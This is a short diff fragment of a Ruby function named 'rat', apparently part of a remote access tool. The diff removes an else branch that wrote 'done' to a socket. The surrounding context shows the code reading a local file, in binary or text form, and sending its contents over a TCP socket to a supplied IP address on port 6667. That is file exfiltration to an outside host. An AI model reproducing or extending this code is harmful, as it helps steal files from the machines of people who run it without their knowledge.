@@ -60,8 +60,6 @@ def rat(ip)
             content = File.binread file
           elsif format == 'text'
             content = File.read file
-          else
-            socket.puts 'done'
           end
           sock = TCPSocket.new(ip,6667)
           sock.write content
